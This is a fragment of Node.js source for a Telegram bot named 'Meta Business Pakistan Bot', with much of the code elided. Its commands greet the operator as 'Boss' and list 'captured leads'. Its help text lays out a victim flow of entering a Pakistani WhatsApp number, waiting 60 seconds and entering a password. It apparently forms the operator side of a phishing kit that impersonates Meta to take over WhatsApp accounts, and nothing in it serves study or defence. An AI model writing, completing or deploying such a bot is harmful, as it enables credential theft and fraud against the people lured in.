...
bot.onText(/\/start/, (msg) => {
    ...
    bot.sendMessage(chatId,
        '👋 *Welcome Boss!*\n\n' +
        '🤖 *Meta Business Pakistan Bot* is now active!\n\n' +
        '📊 *Commands:*\n' +
...
bot.onText(/\/leads/, (msg) => {
    ...
    let message = '📋 *All Captured Leads (Pakistan):*\n\n';
    let count = 1;
...
bot.onText(/\/help/, (msg) => {
    ...
    bot.sendMessage(chatId,
        '❓ *Help Menu - Meta Business Pakistan*\n\n' +
        '*Available Commands:*\n' +
        '• /start - Start the bot\n' +
        '• /status - Check bot status\n' +
        '• /leads - View all captured leads\n' +
        ...
        '2. Enters Pakistani WhatsApp number (+92)\n' +
        '3. Waits 60 seconds\n' +
        '4. Enters password\n' +
...
app.get('/api/health', (req, res) => {
    res.json({ status: 'OK', country: 'Pakistan', timestamp: new Date().toISOString() });
});
